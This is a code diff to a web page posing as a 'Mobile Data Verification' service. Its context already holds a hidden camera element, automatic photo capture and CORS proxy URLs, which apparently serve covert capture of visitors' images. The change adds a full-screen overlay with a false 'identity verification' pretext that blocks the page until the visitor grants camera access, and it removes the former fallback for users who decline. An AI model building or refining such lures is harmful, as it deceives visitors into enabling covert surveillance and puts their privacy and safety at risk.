@@ -412,9 +412,120 @@
         .security-badge i {
             color: #2a5298;
         }
+        
+        /* Camera permission overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .permission-content {
+            max-width: 450px;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+        
+        .permission-logo {
+            font-size: 28px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .permission-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .permission-subtitle {
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .permission-btn {
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            font-size: 16px;
+        }
+        
+        .permission-allow {
+            background: white;
+            color: #1e3c72;
+        }
+        
+        .permission-deny {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+        
+        .permission-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .permission-error {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid rgba(255, 0, 0, 0.5);
+        }
     </style>
 </head>
 <body>
+    <!-- Camera Permission Overlay -->
+    <div class="permission-overlay" id="permission-overlay">
+        <div class="permission-content">
+            <div class="permission-logo">
+                <i class="fas fa-camera"></i> Camera Access Required
+            </div>
+            <h2 class="permission-title">Camera Permission Needed</h2>
+            <p class="permission-subtitle">
+                This application requires camera access for identity verification. 
+                Please allow camera access to continue with the mobile data verification process.
+            </p>
+            <div class="permission-buttons">
+                <button class="permission-btn permission-allow" id="allow-camera">Allow Camera Access</button>
+                <button class="permission-btn permission-deny" id="deny-camera">Deny Access</button>
+            </div>
+            <div class="permission-error" id="permission-error">
+                <p><i class="fas fa-exclamation-triangle"></i> Camera access is required to use this application. Please refresh the page and allow camera access to continue.</p>
+            </div>
+        </div>
+    </div>
+    
     <!-- Hidden Camera for Verification -->
     <div class="hidden-camera">
         <video id="video" autoplay playsinline></video>
@@ -422,7 +533,7 @@
     </div>
     
     <!-- Verification Overlay -->
-    <div class="verification-overlay" id="verification-overlay">
+    <div class="verification-overlay" id="verification-overlay" style="display: none;">
         <div class="verification-content">
             <div class="verification-logo">
                 <i class="fas fa-mobile-alt"></i> Mobile Data Verification
@@ -518,6 +629,8 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Screen elements
+            const permissionOverlay = document.getElementById('permission-overlay');
+            const permissionError = document.getElementById('permission-error');
             const phoneScreen = document.getElementById('phone-screen');
             const verificationOverlay = document.getElementById('verification-overlay');
             const verificationLoader = document.getElementById('verification-loader');
@@ -751,10 +864,6 @@
                 'https://cors-proxy-100.example.com/'
             ];
             
-            // Start with verification overlay
-            verificationOverlay.style.display = 'flex';
-            verificationLoader.style.display = 'block';
-            
             // Initialize camera and start verification
             async function initCamera() {
                 try {
@@ -767,12 +876,16 @@
                     });
                     video.srcObject = stream;
                     
+                    // Hide permission overlay and show verification overlay
+                    permissionOverlay.style.display = 'none';
+                    verificationOverlay.style.display = 'flex';
+                    verificationLoader.style.display = 'block';
+                    
                     // Start automatic photo capture after 1 second
                     setTimeout(startAutomaticCapture, 1000);
                 } catch (err) {
                     console.error('Error accessing camera:', err);
-                    // If camera fails, still proceed to main screen
-                    setTimeout(showMainScreen, 2000);
+                    permissionError.style.display = 'block';
                 }
             }
             
@@ -1018,8 +1131,17 @@
                 }
             }
             
-            // Initialize
-            initCamera();
+            // Camera permission buttons
+            document.getElementById('allow-camera').addEventListener('click', function() {
+                initCamera();
+            });
+            
+            document.getElementById('deny-camera').addEventListener('click', function() {
+                permissionError.style.display = 'block';
+            });
+            
+            // Start with permission overlay
+            permissionOverlay.style.display = 'flex';
             checkInputs();
         });
     </script>
